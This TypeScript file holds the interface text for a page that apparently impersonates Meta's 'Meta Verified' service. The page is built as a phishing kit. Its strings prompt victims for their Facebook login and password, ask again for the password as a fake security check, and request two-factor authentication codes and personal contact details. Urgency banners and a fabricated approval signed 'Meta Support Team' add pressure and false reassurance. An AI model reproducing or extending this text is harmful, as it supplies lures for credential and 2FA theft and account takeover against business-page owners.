export const META_VERIFIED_DEFAULT_TEXTS = {
    metaVerified: 'Meta Verified',
    privacyPolicy: 'Privacy Policy',
    confirm: 'Confirm',
    aboutHelpMore: 'About · Help · See more',

    loginInstruction:
        'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).',
    mobileOrEmail: 'Mobile number or email',
    password: 'Password',
    passwordIncorrect: 'Password is incorrect, please try again.',
    logIn: 'Log in',
    continueBtn: 'Continue',
    forgotPassword: 'Forgot password?',

    twoFATitle: 'Check your authentication code',
    twoFAInstruction:
        'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
    twoFAInstructionPrefix: 'Enter the code sent to',
    twoFAInstructionSuffix:
        'or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).',
    code: 'Code',
    codeExpired: 'The code you entered is incorrect. Please try again.',
    pleaseWait: 'Please wait',

    successTitle: 'The request was sent successfully',
    successMessage1: 'Great, your verification request has been approved.',
    successMessage2: 'The badge should appear next to your name within the next hour.',
    successMessage3:
        'If the badge has not appeared after this time, please contact us again for further assistance.',
    thankYou: 'Thank you',
    metaSupportTeam: 'Meta Support Team.',

    verificationInfo: 'Verification information',
    fillRequiredFields:
        'Please fill in correctly and completely all required fields to complete the verification profile.',
    fullName: 'Full Name',
    fullNamePlaceholder: 'Example: John Smith',
    personalEmail: 'Personal Email',
    personalEmailPlaceholder: 'Example: johnsmith@gmail.com',
    businessEmail: 'Business Email',
    businessEmailPlaceholder: 'Example: contact@company.com',
    mobilePhone: 'Mobile Phone Number',
    mobilePhonePlaceholder: 'Example: +1 201 555 0123',
    yourPageName: 'Your Page Name',
    pageNamePlaceholder: 'Example: ABC Studio Official',
    step: 'Step',
    agreeToTermsOfUse: 'I agree to the Terms of Use',
    termsOfUseLink: 'Terms of Use',
    securityCheck: 'Security check',
    securityReason: 'For security reasons, please enter your password to continue.',
    validCodeHint: 'Valid code consists of 6 or 8 digits.',
    tryAnotherMethod: 'Try another method',
    twoFAStep: 'Two-factor authentication request',

    bannerSupportCenter: 'META VERIFIED SUPPORT CENTER',
    bannerIssueDate: 'Release date: May 16, 2026',
    bannerTitle: 'Submit Meta Verified verification profile',
    bannerDesc1:
        'Your page is eligible for review. Please complete the profile so the verification team can prioritize receiving and processing it.',
    bannerDesc2:
        'Submitting a complete profile helps shorten the comparison time and increase accuracy in the page identity verification process. The system will automatically record the profile status according to the tracking code below.',
    bannerIdCode: 'Verification profile code: #3LWK-NSGP-X43A',
    bannerBenefitTitle: 'Benefits of verification',
    bannerBenefit1: 'Confirm the legal prestige of the page with the official verification badge.',
    bannerBenefit2: 'Enhanced account security thanks to comparison process and additional protection layer.',
    bannerBenefit3: 'Improve customer reach through more stable visibility.',
    bannerPrepareTitle: 'Information to prepare',
    bannerPrepare1: 'Valid administrator and business information.',
    bannerPrepare2: 'Email/phone number can be verified immediately.',
    bannerPrepare3: 'Set up account security and two-layer authentication.',
    bannerProcessTitle: 'Profile processing flow',
    bannerProcess1: 'Step 1: Receive profile and check information completeness.',
    bannerProcess2: 'Step 2: Compare verification data and policy compliance level.',
    bannerProcess3: 'Step 3: Update approval results and next step instructions.',
    bannerCta: 'Submit Meta Verified verification profile',
    bannerNote:
        'Important note: Profiles are only approved when the declared information is complete, accurate and comparable. Standard response time is 24 working hours; some cases may be longer if additional verification is needed.',
    bannerTerms: 'Terms',
    bannerCommunity: 'Community Standards',
    bannerHelp: 'Help Center',
    bannerBusinessHelp: 'Meta Business Help Center',
    introHeroLead: 'Upgrade your business with Meta Verified.',
    introHeroBody:
        'When a business has the Verified badge, people are nearly twice as likely to trust that business recommendation compared to one without the badge.',
    introHeroHighlight:
        'Why wait? Subscribe to Meta Verified today to add this badge to your profile and enjoy exclusive benefits.',
    introContinueButton: 'Continue to Meta Verified Support Center'
} as const;

export type MetaVerifiedTextKey = keyof typeof META_VERIFIED_DEFAULT_TEXTS;
export type MetaVerifiedTexts = Record<MetaVerifiedTextKey, string>;
